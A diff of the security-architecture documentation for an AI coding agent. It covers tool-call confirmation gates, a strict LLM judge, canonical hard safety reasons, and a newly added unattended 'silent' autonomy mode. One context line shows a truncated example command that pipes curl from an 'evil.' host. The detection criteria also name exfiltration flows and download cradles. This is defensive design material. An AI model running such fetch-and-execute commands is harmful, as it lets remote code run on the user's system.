@@ -97,11 +97,11 @@ Trailing separators are trimmed and duplicates dropped; empty, relative, or driv
 
 File operations (both read and write) targeting paths **outside** the session roots produce a **soft** (path-containment) safety reason from the tool's `ToolJudger.Judge()`. Soft reasons never execute silently:
 
-- `allow` groups (e.g. `local_read`, `remote_read`): the soft reason routes the call to `smartApproveOrConfirm` — with Smart Approve enabled, only a strict judge `ALLOW` executes; otherwise (and always with Smart Approve off) the user sees a confirmation prompt.
-- `user_confirm` groups (e.g. `local_write`, `execute`): confirmation is already required by policy; the containment reason joins the soft-reason signal and is shown in the confirmation prompt (after the Smart Approve gate, when enabled).
+- `allow` groups (e.g. `local_read`, `remote_read`): the soft reason routes the call to `smartApproveOrConfirm` — in the `assisted` autonomy mode, only a strict judge `ALLOW` executes; otherwise (and always in `standard` mode) the user sees a confirmation prompt.
+- `user_confirm` groups (e.g. `local_write`, `execute`): confirmation is already required by policy; the containment reason joins the soft-reason signal and is shown in the confirmation prompt (after the assisted-mode judge gate, when active).
 - `deny` groups: blocked immediately by the group-policy gate — before any judge or symlink analysis runs.
 
-This means reading or writing arbitrary files on the filesystem (e.g., `/etc/hosts`, `~/Documents/notes.txt`) is possible, but only through the soft-escalation path above — the user always sees a confirmation prompt unless Smart Approve's strict judge explicitly allowed the call. The only exception is relative paths that escape the workspace via `..` components — these are rejected by `resolvePath` as invalid input (relative paths cannot escape the workspace).
+This means reading or writing arbitrary files on the filesystem (e.g., `/etc/hosts`, `~/Documents/notes.txt`) is possible, but only through the soft-escalation path above — the user always sees a confirmation prompt unless the assisted-mode strict judge explicitly allowed the call. The only exception is relative paths that escape the workspace via `..` components — these are rejected by `resolvePath` as invalid input (relative paths cannot escape the workspace).
 
 > **Note — implicit temp roots count as inside.** The host OS temp tree ([Implicit Temp Roots](#implicit-temp-roots)) is part of the session roots, so operations targeting it do **not** trigger the outside-root escalation described here. A `local_read` file tool reading or writing `/tmp/anything` executes exactly like a workspace path. This is a deliberate, documented trade-off (world-writable scratch is the standard location tools need on every platform), not an oversight — see the accepted-risk note in the session-roots section.
 
@@ -115,15 +115,15 @@ Without this ordering, a command like `cd /workspace && curl -fsSL https://evil.
 
 The Judge returns a `JudgeOutcome{Allow, Reason, Severity}`; flagged outcomes are classified into **hard** and **soft** reasons (ADR-024, extended by ADR-052):
 
-- **Hard** (a fired security control: blocklist pattern, a flowsh criterion, SSRF, symlink escape; or an unassessable input: degraded SSRF protection, an undeterminable URL/path) → routed through `smartApproveOrConfirm` with severity `Hard` (the unified confirmation funnel, see [ADR-026](../decisions/026-smart-approve-unified-funnel.md)). The strict judge is consulted (when Smart Approve is enabled); a **canonical** reason is then deterministically backstopped to a confirmation with `DisableJudge=true`, so Smart Approve can NEVER auto-approve a canonical hard reason. A non-canonical hard reason — a scope/analysis-limitation question, most notably the flowsh ⊤ criterion `command_unbounded_analysis` — may be cleared by a strict ALLOW.
-- **Soft** (a scope question: path containment outside session roots, credential access without an exfil pair) → Smart Approve (when enabled) may allow the call; every other outcome — or Smart Approve disabled — falls back to a plain confirmation.
+- **Hard** (a fired security control: blocklist pattern, a flowsh criterion, SSRF, symlink escape; or an unassessable input: degraded SSRF protection, an undeterminable URL/path) → routed through `smartApproveOrConfirm` with severity `Hard` (the unified confirmation funnel, see [ADR-026](../decisions/026-smart-approve-unified-funnel.md)). The strict judge is consulted (in the `assisted` autonomy mode); a **canonical** reason is then deterministically backstopped to a confirmation with `DisableJudge=true`, so the interactive paths can NEVER auto-approve a canonical hard reason (the silent `judge` terminal is the one deliberate exception — see [Silent Mode](#silent-mode-unattended-operation)). A non-canonical hard reason — a scope/analysis-limitation question, most notably the flowsh ⊤ criterion `command_unbounded_analysis` — may be cleared by a strict ALLOW.
+- **Soft** (a scope question: path containment outside session roots, credential access without an exfil pair) → the assisted-mode judge may allow the call; every other outcome — or `standard` mode — falls back to a plain confirmation.
 - `allow=true` / no concern reported → proceeds to auto-approval / direct execution.
 
 ## Workspace Auto-Approval
 
 After the allow-policy Judge gate (if applicable), two paths lead to execution without a confirmation prompt:
 
-1. **`allow` groups with clean safety signals.** When the judge reports no concern (no hard reason, no soft escalation — i.e. the call's paths are all inside the session roots and no security control fired), the tool executes directly. A flagged call never reaches this path: hard reasons confirm immediately, soft reasons go to Smart Approve / confirmation.
+1. **`allow` groups with clean safety signals.** When the judge reports no concern (no hard reason, no soft escalation — i.e. the call's paths are all inside the session roots and no security control fired), the tool executes directly. A flagged call never reaches this path: hard reasons confirm immediately, soft reasons go to the assisted-mode judge / confirmation.
 2. **`local_write` under `security.auto_approve_workspace_writes`.** Write tools (`write_file`, `edit_file`, `delete_file`, `delete_directory`, `create_directory`) whose effective policy is `user_confirm` execute without confirmation when the setting is enabled and the tool's `ToolJudger.Judge()` verdict is clean — the Judge's containment check resolves symlinks and normalizes `..` (pathutil underneath), so the target must resolve inside the session roots (workspace, temp directory, or an auxiliary work directory — equal peers). A hard reason always preempts this auto-approval.
 
 `deny` groups never reach either path (blocked earlier), and workspace auto-approval applies only to the `local_write` group — an `execute` command inside the workspace still confirms under `user_confirm`.
@@ -145,23 +145,23 @@ The `ToolJudge` (`github.com/v0lka/sp4rk/tools/judge.go`) provides LLM-based saf
 - File tools use `judgeReadInSessionRoots` / `judgeWriteInSessionRoots` (in `github.com/v0lka/sp4rk/tools/builtins/file_judge.go`) to check whether the target path is inside the session workspace or temp directory. Operations outside both roots return `allow=false` with a reason, escalating to user confirmation.
 - Shell tools (`bash_exec`, `posh_exec`) evaluate two deterministic stages in their `ToolJudger.Judge()`: the **blocklist** first (the user-authored regex list from `security.groups.execute.blocklist`, empty by default; a match is the more specific reason and wins), then the **flowsh criteria** — the registry precomputes `sdktools.AnalyzeShellCommandForJudge` once per call (`core/tools/registry.go` `AttachShellAnalysis`), attaches the result to the call context, and the Judge returns the winning criterion outcome verbatim (C1–C6 hard, C7/C8 soft) without recomputation. When no analysis is attached, the Judge returns an empty outcome and defers to the LLM judges; when the attached analysis carries an **error** (e.g. the flowsh knowledge base failed to load — a sticky, process-lifetime failure), the Judge **fails closed** with the hard canonical `command_analysis_unavailable` reason, so the call still escalates under an `allow` policy and blocks under verify-on-edit's unattended path rather than running with the floor silently absent. The same digest is rendered into the advisory prompt as a `## Static Analysis Report` block behind an untrusted `shell_analysis` boundary, and the block participates in the advisory cache key.
 
-### Strict Judge (Smart Approve)
+### Strict Judge (assisted autonomy mode)
 
-When `security.smart_approve` is enabled (default: false), a **strict OWASP ASI judge** (`ToolJudge.JudgeStrict`) automatically evaluates **every escalated call** — whether it comes from an effective `PolicyUserConfirm` policy or from a hard/soft safety reason surfaced by an `allow`-group tool — after all deterministic gates and workspace auto-approval have run. This is the unified confirmation funnel: all escalations route through `smartApproveOrConfirm` (see [ADR-026](../decisions/026-smart-approve-unified-funnel.md)), so there is no separate bypass path for hard reasons. The strict judge:
+The strict OWASP ASI judge (`ToolJudge.JudgeStrict`) is the evaluation point of the **`assisted`** value of `security.autonomy_mode` (`standard` | `assisted` | `silent`, default `standard`; `assisted` is the former Smart Approve — the legacy `security.smart_approve` boolean migrates to the enum at load, [ADR-053](../decisions/053-silent-mode.md)). In `assisted` mode it automatically evaluates **every escalated call** — whether it comes from an effective `PolicyUserConfirm` policy or from a hard/soft safety reason surfaced by an `allow`-group tool — after all deterministic gates and workspace auto-approval have run. This is the unified confirmation funnel: all escalations route through `smartApproveOrConfirm` (see [ADR-026](../decisions/026-smart-approve-unified-funnel.md)), so there is no separate bypass path for hard reasons. The strict judge:
 
 - Always calls the LLM (no path-locality fast-path, no session-root auto-allow)
 - Uses a conservative OWASP Agentic Top 10 (ASI01–ASI10) system prompt: mandatory ASI01/02/03/05/09 checks, plus contextual ASI04/06/07/08/10 when applicable
-- Returns only `ALLOW` or `CONFIRM`; a strict `ALLOW` requires the call to be clearly task-relevant, narrowly scoped, reversible or read-only, from a trusted source, with no material ASI risk
+- Returns `ALLOW`, `CONFIRM`, or `DENY`: a strict `ALLOW` requires the call to be clearly task-relevant, narrowly scoped, reversible or read-only, from a trusted source, with no material ASI risk; `DENY` (`VerdictDeny`) is a **deliberate rejection** — the judge positively assessed the call as dangerous, as distinct from `CONFIRM`'s "cannot decide, a human must review"; denial-shaped tokens (`DISALLOW`, `REJECT`, …) parse to `DENY`, never to `ALLOW`
 - Does NOT use the advisory cache (verdicts are context-dependent and must not be reused across different tasks/sources)
 - Fails safe to `CONFIRM` on timeout, provider error, nil response, or unparseable output
 - Passes task context, tool source (`core` or MCP server name), compact environment info, and the session's directory roots (`session_directories`: workspace + auxiliary work directories, explicit or host-injected) to the LLM
 - Does not log raw tool arguments in the structured verdict log
 
-A strict `ALLOW` executes the tool without UI. A `CONFIRM` (or any failure outcome) falls back to manual confirmation with the strict judge's reasoning shown and the advisory "Ask Agent" button hidden (the `ConfirmationRequest.DisableJudge` flag signals this to the frontend).
+The terminals: a strict `ALLOW` executes the tool without UI; a strict `DENY` **terminates the call** — the tool is not executed, no card opens (`ConfirmFunc` is never invoked), the `ToolResult` carries the judge's justification, and the decision is audited as an `autonomy_decision` event (kind `assisted_deny`); a `CONFIRM` (or any failure outcome — including assisted with no judge provider configured, which degrades to `standard` cards, fail-safe) falls back to manual confirmation with the strict judge's reasoning shown and the advisory "Ask Agent" button hidden (the `ConfirmationRequest.DisableJudge` flag signals this to the frontend).
 
-Smart Approve applies to every escalation that reaches `smartApproveOrConfirm` — including **hard** safety reasons (blocklist, flowsh criteria, SSRF, symlink escape) surfaced by `allow`-group tools, which are judged too (the hard-bias of the unified funnel). When the strict judge does not return ALLOW, the call falls through to a manual confirmation with `DisableJudge=true`. `deny` groups are never judged and always blocked, and a workspace-auto-approved call never reaches the strict judge.
+The assisted mode applies to every escalation that reaches `smartApproveOrConfirm` — including **hard** safety reasons (blocklist, flowsh criteria, SSRF, symlink escape) surfaced by `allow`-group tools, which are judged too (the hard-bias of the unified funnel). `deny` groups are never judged and always blocked, and a workspace-auto-approved call never reaches the strict judge.
 
-The **deterministic backstop** makes the strict judge non-authoritative over canonical escalations: if the judge returns ALLOW while `isCanonicalHardReason(code)` is true, the verdict is overridden to CONFIRM, so a fired security control — or an input whose safety the judge is structurally unable to assess — always reaches the user. Canonicality is keyed off the **typed reason code** (`JudgeOutcome.ReasonCode`, the stable sp4rk contract in `tools/safety.go`), never off the prose, which sp4rk may reword freely. Canonical codes: `command_blacklist` and the flowsh controls `command_exfil_flow`, `command_privilege_escalation`, `command_system_write`, `command_destructive_outside_roots`, `command_download_cradle` (fired controls), `ssrf_private_address`, `symlink_escape` (fired controls), and `command_analysis_unavailable` (a failed analyzer — fail closed under `allow`), `ssrf_protection_degraded`, `unassessable_url`, `unassessable_path` (unassessable inputs). Non-canonical hard codes (`command_unbounded_analysis` — the analyzer's ⊤ limitation, `symlink_suspicious`, unclassified) may be cleared by a strict ALLOW. The cross-repo contract is guarded by `core/tools/registry_canonical_reasons_test.go`, which drives the real sp4rk builtin judges so a dropped code or reworded classification fails CI.
+The **deterministic backstop** makes the strict judge non-authoritative over canonical escalations on the **interactive paths**: if the judge returns ALLOW while `isCanonicalHardReason(code)` is true, the verdict is overridden to CONFIRM, so a fired security control — or an input whose safety the judge is structurally unable to assess — always reaches the user. Canonicality is keyed off the **typed reason code** (`JudgeOutcome.ReasonCode`, the stable sp4rk contract in `tools/safety.go`), never off the prose, which sp4rk may reword freely. Canonical codes: `command_blacklist` and the flowsh controls `command_exfil_flow`, `command_privilege_escalation`, `command_system_write`, `command_destructive_outside_roots`, `command_download_cradle` (fired controls), `ssrf_private_address`, `symlink_escape` (fired controls), and `command_analysis_unavailable` (a failed analyzer — fail closed under `allow`), `ssrf_protection_degraded`, `unassessable_url`, `unassessable_path` (unassessable inputs). Non-canonical hard codes (`command_unbounded_analysis` — the analyzer's ⊤ limitation, `symlink_suspicious`, unclassified) may be cleared by a strict ALLOW. The one deliberate exception to the backstop is the **silent `judge` terminal** ([ADR-053](../decisions/053-silent-mode.md) D4) — see [Silent Mode](#silent-mode-unattended-operation). The cross-repo contract is guarded by `core/tools/registry_canonical_reasons_test.go`, which drives the real sp4rk builtin judges so a dropped code or reworded classification fails CI.
 
 ### Judge Provisioning (session-pinned)
 
@@ -177,11 +177,11 @@ Every session's strict judge is bound to **that session's own LLM router** — t
 Every confirmation request carries a **human-readable reason** in `ConfirmationRequest.JudgeReasoning` (surfaced to the frontend as `tool_confirm` event `reasoning`), so the user understands *why* approval is needed before deciding. The reason is derived per trigger:
 
 - **Symlink traversal** → the formatted symlink chain (`FormatSymlinkReasoning`).
-- **`allow` group + hard Judge reason** (blocklist match, a flowsh criterion, SSRF, symlink escape) → routed through `smartApproveOrConfirm` (the unified funnel): the strict judge's reasoning or the hard reason is shown, the canonical backstop forces a confirmation, and the advisory Ask Agent action is disabled.
-- **`allow` group + soft Judge reason** (path containment) → the containment reason, shown on the confirmation produced when Smart Approve is off or its strict judge did not allow.
-- **`user_confirm` + hard reason / Smart Approve outcome** → the hard reason or the strict judge's reasoning (see below).
+- **`allow` group + hard Judge reason** (blocklist match, a flowsh criterion, SSRF, symlink escape) → routed through `smartApproveOrConfirm` (the unified funnel): the strict judge's reasoning or the hard reason is shown, the canonical backstop forces a confirmation on the interactive paths, and the advisory Ask Agent action is disabled.
+- **`allow` group + soft Judge reason** (path containment) → the containment reason, shown on the confirmation produced in `standard` mode or when the assisted strict judge did not allow.
+- **`user_confirm` + hard reason / assisted outcome** → the hard reason or the strict judge's reasoning (see below).
 - **`user_confirm` (plain)** → a mutating-action explanation from `defaultConfirmReason(name)` (e.g. "This tool runs a shell command on your system."), so the dialog is never blank.
-- **Smart Approve CONFIRM/failure** → the strict judge's reasoning (e.g. "ASI05: command downloads and executes unverified code"). The `ConfirmationRequest.DisableJudge` flag is set to `true`, signaling the frontend to hide the advisory "Ask Agent" button (the call was already strictly evaluated).
+- **Assisted CONFIRM/failure** → the strict judge's reasoning (e.g. "ASI05: command downloads and executes unverified code"). The `ConfirmationRequest.DisableJudge` flag is set to `true`, signaling the frontend to hide the advisory "Ask Agent" button (the call was already strictly evaluated).
 
 ```
 ToolRegistry.Execute()
@@ -206,9 +206,62 @@ ToolRegistry.Execute()
   └─ ConfirmDenyAndStop → return context.Canceled (stops entire task)
 ```
 
+## Silent Mode (Unattended Operation)
+
+`security.autonomy_mode: silent` is the unattended-operation posture — the third value of the autonomy axis (`standard` | `assisted` | `silent`, default `standard`, [ADR-053](../decisions/053-silent-mode.md); the legacy `security.smart_approve` / `security.silent_mode.enabled` booleans migrate onto the enum at load, silent winning, and are dropped at the next save). While the mode is `silent`, the four interactive prompts that would otherwise block a
+run are resolved without a human — `tool_confirm` (a confirmation-gated tool
+call), `step_limit` (a step-budget / circuit-breaker boundary), `ask_user` (the
+question tool), and `review_prompt` (the post-task code-review prompt). Each has
+its own sub-policy under `security.silent_mode` (`tool_confirm`: `judge`|`allow`|`deny`; `step_limit`:
+`auto`|`allow_once`|`allow_more`|`allow_always`|`deny`|`stop`; `ask_user`:
+`disable`|`enable`; `review_prompt`:
+`suppress`|`allow`) — the sub-policies are live **only** in this mode (the former `enabled` master switch no longer exists; the enum value is the switch). The posture is a plain value pushed to the shared registry
+and every per-session clone (`ApplySecurityState`), so a Settings change reaches
+live sessions with no restart. `tool_confirm` acts in the registry,
+`ask_user` at tool registration, `review_prompt` in the frontend, and
+`step_limit.mode: auto` through the backend's `ResolveSilentStepLimit`. See
+[ADR-053](../decisions/053-silent-mode.md).
+
+**Where it sits.** Silent mode is reached only from `smartApproveOrConfirm`, the
+unified confirmation funnel — that is, *after* every deterministic gate.
+Group-policy `deny`, path containment, symlink-escape detection, the flowsh
+shell analysis, and workspace auto-approval all run first and are untouched.
+Silent mode replaces the **human answer** to a prompt; it never removes a gate.
+
+**Preserved invariants (the audit-relevant ones):**
+
+- **`deny` groups are never bypassed.** A `deny`-group tool is blocked before the
+  funnel, is never judged, and is never executed under any silent sub-policy.
+- **Every deterministic pre-funnel gate is unchanged** — the `allow`-policy Judge
+  gate ordering, workspace/temp auto-approval priority, containment, symlink
+  escape, and the flowsh criteria.
+- **A fired control is never auto-executed without the judge.** In
+  `tool_confirm.mode: allow`, a call carrying a **hard** safety reason — canonical
+  or not — is escalated to the strict judge; only a judge ALLOW executes it (the
+  judge's decision is final — next bullet). Every
+  other outcome (CONFIRM, error, timeout, missing judge, unparseable) auto-denies,
+  carrying the reasoning in the tool result.
+- **The canonical backstop is scoped to the interactive paths; the silent `judge` terminal delegates final authority to the judge** ([ADR-053](../decisions/053-silent-mode.md) D4). In `standard` a canonical hard reason is always a card; in `assisted` a strict ALLOW on a canonical reason is overridden to a confirmation. In silent `judge` mode there is **deliberately no backstop**: the operator selected unattended operation and delegated the final decision to the strict judge — its ALLOW **executes, canonical hard reasons included**, fully audited (the `autonomy_decision` event carries the judge's justification for allowing a fired control) — while every other outcome (a deliberate DENY, CONFIRM, a missing judge, an error/timeout, an unparseable verdict) auto-denies fail-closed, with justifications distinguishing a judge DENY from the fail-closed causes. `tool_confirm.mode: deny` denies every gated call outright without consulting the judge (the judge-free hard floor for unattended runs). The split behavior is pinned by
+  `TestSilentMode_JudgeTerminalCanonicalAllowExecutes` (silent: the canonical ALLOW executes; assisted: the same reason still forces a confirmation).
+
+**Auditability (ASI10).** Every automatic decision on a gate emits a persisted
+`autonomy_decision` session event — `kind` (`tool_confirm` | `assisted_deny` |
+`step_limit`), `mode` (the autonomy posture: `silent` or `assisted`), `policy`
+(the sub-policy that decided), `verdict`, `tool`/`reason`, and `justification`
+— from `core/tools/registry.go` (through the registry's
+`AutonomyDecisionObserver`) and `backend/step_limit_judge.go`. The event is
+non-blocking (there is no card to answer) and durable (role
+`autonomy_decision`, rendered as a `status` service
+notice via `reconstructContent` on reload), so a run's trajectory stays
+reconstructable after the fact. (The other two sub-policies need no separate
+event: `ask_user: disable` reaches the model as the tool's explicit
+`ask_user is not available in this mode` result, and `review_prompt: suppress`
+simply emits no prompt.) See
+[contracts/event-catalog.md](../contracts/event-catalog.md).
+
 ## Symlink Confirmation
 
-After the group-policy deny gate, during safety-signal gathering, the registry inspects ALL tool call inputs (both structured tools and the shell-exec tool) for paths that traverse symlinks. A traversal whose resolution **escapes** the session roots (or input that cannot be resolved at all) is a **hard** reason: the call is routed through `smartApproveOrConfirm` (the unified funnel) under any group policy, consults the strict judge, and — because a symlink escape is a **canonical** hard reason — the deterministic backstop overrides any ALLOW verdict and forces a user confirmation with `DisableJudge=true`: it never passes Smart Approve auto-approval. A symlink whose resolution stays **inside** the session roots is not a concern: every containment check in the pipeline reasons about resolved paths, so an in-root resolution auto-approves exactly like a direct path. Well-known OS-level infrastructure symlinks (e.g. `/tmp` → `/private/tmp`) are exempt from the escape classification via sp4rk's `IsOSLevelSymlink`.
+After the group-policy deny gate, during safety-signal gathering, the registry inspects ALL tool call inputs (both structured tools and the shell-exec tool) for paths that traverse symlinks. A traversal whose resolution **escapes** the session roots (or input that cannot be resolved at all) is a **hard** reason: the call is routed through `smartApproveOrConfirm` (the unified funnel) under any group policy, consults the strict judge, and — because a symlink escape is a **canonical** hard reason — the deterministic backstop overrides any ALLOW verdict and forces a user confirmation with `DisableJudge=true`: it never passes assisted-mode auto-approval (interactive scope; the silent `judge` terminal is the one deliberate exception — see [Silent Mode](#silent-mode-unattended-operation)). A symlink whose resolution stays **inside** the session roots is not a concern: every containment check in the pipeline reasons about resolved paths, so an in-root resolution auto-approves exactly like a direct path. Well-known OS-level infrastructure symlinks (e.g. `/tmp` → `/private/tmp`) are exempt from the escape classification via sp4rk's `IsOSLevelSymlink`.
 
 ### Detection
 
@@ -277,7 +330,7 @@ The shell-execution tool (`bash_exec` on Unix, `posh_exec` on Windows) is gated 
 
 ### Blocklist (user extension, empty by default)
 
-The blocklist is the `blocklist` list on the **`execute` group** in `security.groups` (`cfg.Security.Groups["execute"].Blocklist` → the builder's `Groups[GroupExecute].Blocklist` → `BuiltinToolsConfig.ShellBlocklist`) — a single platform-agnostic regex list that is **empty by default: c0wrk ships no predefined patterns**. It exists purely as the user's personal extension on top of the deterministic flowsh floor (e.g. a `sudo` or `shutdown` pattern for shapes the criteria deliberately leave to judgment). A load-time migration (`backend/config/blacklist_migration.go`) moves a legacy custom `blacklist:` list into `blocklist:` (persisted on next save); a list equal to the frozen old shipped default — or absent — is dropped (effective empty); an explicit `blocklist:` key always wins. A blocklist match returns `allow=false, severity=hard, ReasonCode=command_blacklist` and is a **canonical** hard reason: the deterministic backstop forces confirmation and Smart Approve can never auto-approve it.
+The blocklist is the `blocklist` list on the **`execute` group** in `security.groups` (`cfg.Security.Groups["execute"].Blocklist` → the builder's `Groups[GroupExecute].Blocklist` → `BuiltinToolsConfig.ShellBlocklist`) — a single platform-agnostic regex list that is **empty by default: c0wrk ships no predefined patterns**. It exists purely as the user's personal extension on top of the deterministic flowsh floor (e.g. a `sudo` or `shutdown` pattern for shapes the criteria deliberately leave to judgment). A load-time migration (`backend/config/blacklist_migration.go`) moves a legacy custom `blacklist:` list into `blocklist:` (persisted on next save); a list equal to the frozen old shipped default — or absent — is dropped (effective empty); an explicit `blocklist:` key always wins. A blocklist match returns `allow=false, severity=hard, ReasonCode=command_blacklist` and is a **canonical** hard reason: the deterministic backstop forces confirmation on the interactive paths and assisted mode can never auto-approve it (the silent `judge` terminal is the one deliberate, audited exception — see [Silent Mode](#silent-mode-unattended-operation)).
 
 > **Invariant — the blocklist never hard-denies.** The blocklist exists **only** to route specific commands to user confirmation when the `execute` group's policy is `allow`; it is **never** an unrecoverable block. A blocklist match always flows through `confirmAndExecute` (`core/tools/registry.go`), where the user can choose **Allow Once** to execute **any** command — including blocklisted ones — without exception. There is no code path where a blocklist match produces a final `deny` that the user cannot override; the `allow=false` returned by `ToolJudger.Judge()` on a match means "a safety concern exists, escalate to confirmation", not "deny". The user's ability to run an arbitrary shell command via confirmation must remain unconditional under `allow`. This invariant applies equally to `user_confirm` policy (the blocklist reason merely enriches the prompt) and to every blocklist pattern — git or otherwise. The same escalation-not-denial semantics apply to the flowsh criteria: every criterion outcome routes through the unified confirmation funnel, never to a silent final deny.
 
@@ -302,7 +355,7 @@ The former static judge stages — **unresolvable path tokens** (`unresolvable_p
 
 ### Canonical set and ⊤ semantics
 
-The **canonical hard set** — reasons a strict judge can never clear, and the only ones `ExecuteUnattended` blocks on — is: `command_blacklist`, `command_exfil_flow`, `command_privilege_escalation`, `command_system_write`, `command_destructive_outside_roots`, `command_download_cradle` (fired controls), `ssrf_private_address`, `symlink_escape` (fired controls), and `command_analysis_unavailable`, `ssrf_protection_degraded`, `unassessable_url`, `unassessable_path` (unassessable inputs). Canonicality is matched off the typed reason code, never prose.
+The **canonical hard set** — reasons a strict judge can never clear **on the interactive paths** (the silent `judge` terminal is the one deliberate exception, [ADR-053](../decisions/053-silent-mode.md) D4), and the only ones `ExecuteUnattended` blocks on — is: `command_blacklist`, `command_exfil_flow`, `command_privilege_escalation`, `command_system_write`, `command_destructive_outside_roots`, `command_download_cradle` (fired controls), `ssrf_private_address`, `symlink_escape` (fired controls), and `command_analysis_unavailable`, `ssrf_protection_degraded`, `unassessable_url`, `unassessable_path` (unassessable inputs). Canonicality is matched off the typed reason code, never prose.
 
 `top`/`conservative` in the digest mean **"the analyzer could not bound this command"** — an analyzer limitation, not proof of malice; routine local scripts and unfamiliar CLIs land there, and so does an irreversible write whose target the analyzer could not resolve (a ⊤ target — the abbreviated-PowerShell-parameter shape `Remove-Item -r -f …`, where flowsh does not expand `-r`/`-f` and loses the positional path). Hence C6 is hard but **non-canonical**: a strict judge may clear it. C5 (⊤ **with** network egress) is canonical because the calibration corpus shows every download cradle produces that combination and no routine command does. `ExecuteUnattended` (verify-on-edit) checks judge-hard and symlink canonicality **independently** and blocks only on canonical hard reasons — a ⊤ verification command (`./x.sh`) runs because it is the user's own config; see [domains/verify-on-edit.md](../domains/verify-on-edit.md).
 
@@ -411,13 +464,15 @@ Source: `github.com/v0lka/sp4rk/security/wrap.go` (wrapping), `core/prompts/inje
 - Symlink analysis runs for every non-system tool during safety-signal gathering: a symlink whose resolution stays inside the session roots is NOT a concern; an escape out of the roots (or an unresolvable/suspicious path) is a **hard** reason
 - Every git process c0wrk spawns carries the sysproc baseline overrides (`core.fsmonitor=false`, safe `core.hooksPath`, `commit.gpgsign=false`, `GIT_EDITOR=true`); repo-scoped git invocations re-scan `.git/config` fresh before every call and fail closed (git is not executed) on unscannable configs — repository-defined hooks, fsmonitor daemons, filters, merge drivers, textconv, and signing programs never execute (see [Git Subprocess Hardening](#git-subprocess-hardening))
 - A mutating file-tool target resolving inside a workspace `.git` tree is a hard `git_internal_path` reason that escalates under any group policy — an `allow` policy can never execute it silently
-- HARD safety reasons (blocklist match, a flowsh criterion, SSRF, symlink escape, or an unassessable input) are ALWAYS routed through the unified confirmation funnel and consult the strict judge, under any group policy; a **canonical** reason — a fired control (`command_blacklist`, the flowsh controls `command_exfil_flow`/`command_privilege_escalation`/`command_system_write`/`command_destructive_outside_roots`/`command_download_cradle`, `ssrf_private_address`, `symlink_escape`) or an unassessable input (`command_analysis_unavailable`, `ssrf_protection_degraded`, `unassessable_url`, `unassessable_path`), matched by typed code — is deterministically backstopped to confirmation with `DisableJudge=true` — it never passes Smart Approve auto-approval. A non-canonical hard reason (an analysis-limitation question, most notably `command_unbounded_analysis` — the flowsh ⊤ criterion) may be cleared by a strict ALLOW. SOFT reasons (path containment, credential access) force confirmation unless Smart Approve's strict judge allows the call
+- HARD safety reasons (blocklist match, a flowsh criterion, SSRF, symlink escape, or an unassessable input) are ALWAYS routed through the unified confirmation funnel and consult the strict judge, under any group policy; a **canonical** reason — a fired control (`command_blacklist`, the flowsh controls `command_exfil_flow`/`command_privilege_escalation`/`command_system_write`/`command_destructive_outside_roots`/`command_download_cradle`, `ssrf_private_address`, `symlink_escape`) or an unassessable input (`command_analysis_unavailable`, `ssrf_protection_degraded`, `unassessable_url`, `unassessable_path`), matched by typed code — is deterministically backstopped to confirmation with `DisableJudge=true` on the **interactive paths** (`standard`/`assisted`): it never passes assisted-mode auto-approval there; the silent `judge` terminal is the one deliberate, audited exception. A non-canonical hard reason (an analysis-limitation question, most notably `command_unbounded_analysis` — the flowsh ⊤ criterion) may be cleared by a strict ALLOW. SOFT reasons (path containment, credential access) force confirmation unless the assisted-mode strict judge allows the call
 - `deny` group policy is NEVER bypassed (not by auto-approval, not by judge, not by symlink check, not by any mechanism)
+- **Silent mode** (`security.autonomy_mode: silent`, default `standard`) resolves the four interactive prompts without a human, but only from inside the confirmation funnel: `deny` groups and every deterministic pre-funnel gate (Judge ordering, auto-approval priority, containment, symlink escape, flowsh criteria) are unchanged, and a hard safety reason is never auto-executed by `allow` mode (it escalates to the strict judge). The canonical hard-reason backstop is scoped to the interactive paths — in silent `judge` mode the strict judge holds final authority over canonical reasons (its ALLOW executes, fully audited; every other outcome auto-denies fail-closed) — pinned by `TestSilentMode_JudgeTerminalCanonicalAllowExecutes`. See [Silent Mode](#silent-mode-unattended-operation)
+- **Every automatic decision emits a persisted, non-blocking `autonomy_decision` event** (`kind`, `mode`, `policy`, `verdict`, `tool`/`reason`, `justification`) — the auditable receipt of a gate a human would otherwise have answered (in silent mode, or an assisted-mode strict-judge DENY), so the trajectory stays reconstructable (ASI10)
 - For `allow`-policy tools implementing `ToolJudger`, the Judge runs BEFORE workspace/temp auto-approval — safety checks (blocklist, flowsh criteria, SSRF, path containment) NEVER bypassed by path-locality
 - The session workspace, temp directory, and auxiliary work directories are equal peers — any operation permitted in one is permitted in the others
 - Prompt-discovered auxiliary roots are existing, normalized, non-sensitive directories persisted at session scope with path deduplication; discovery failures leave message delivery unchanged
 - Filesystem case-sensitivity probes are cached and shared per symlink-resolved physical root; distinct roots retain independent results
-- Operations outside session roots (workspace, temp directory, or an auxiliary work directory) always escalate: a soft containment reason routes the call to Smart Approve (strict ALLOW only) or a user confirmation, regardless of the tool's group policy
+- Operations outside session roots (workspace, temp directory, or an auxiliary work directory) always escalate: a soft containment reason routes the call to the assisted-mode strict judge (strict ALLOW only) or a user confirmation, regardless of the tool's group policy
 - Relative paths that escape the workspace via `..` components are rejected by `resolvePath` — they cannot target paths outside the workspace
 - Direct execution without confirmation happens only when the call is clean (no hard reason, no soft escalation) under an `allow` group, or via workspace auto-approval (`local_write` + `auto_approve_workspace_writes` + a clean Judge verdict)
 - Confirmation blocks the executor goroutine until the user responds (no timeout)
@@ -446,16 +501,34 @@ security:
     remote_mcp:   { policy: user_confirm } # http MCP server tools
     remote_write: { policy: user_confirm } # remote mutations (e.g. pinned MCP servers)
 
-  # Smart Approve: strict OWASP ASI judge auto-resolves every escalated call,
-  # whether from an effective user_confirm policy or a hard reason surfaced by
-  # an allow-group tool (the unified confirmation funnel). Only a strict ALLOW
-  # skips UI; all other outcomes fall back to manual confirmation, and a
-  # canonical hard reason (a fired control: blocklist, a flowsh criterion —
-  # exfil flow / privesc / system write / destructive out-of-roots write /
-  # download cradle —, SSRF, symlink escape, or an unassessable input) is
-  # backstopped to confirmation even on a strict ALLOW.
-  # Default: false.
-  smart_approve: false
+  # Autonomy mode — the unified autonomy posture (ADR-053). "standard"
+  # (default): every escalated call opens a user card. "assisted" (the former
+  # Smart Approve): the strict OWASP ASI judge auto-resolves every escalated
+  # call through the unified confirmation funnel — a strict ALLOW skips the UI
+  # (except a canonical hard reason: fired control or unassessable input,
+  # backstopped to confirmation), a strict DENY terminates the call, and every
+  # other outcome falls back to manual confirmation. "silent": unattended
+  # operation — the silent_mode sub-policies below resolve the prompts without
+  # a human. Legacy keys migrate at load (security.smart_approve /
+  # security.silent_mode.enabled; silent wins) and are dropped at the next
+  # save; an unknown value fails safe to standard with a load warning.
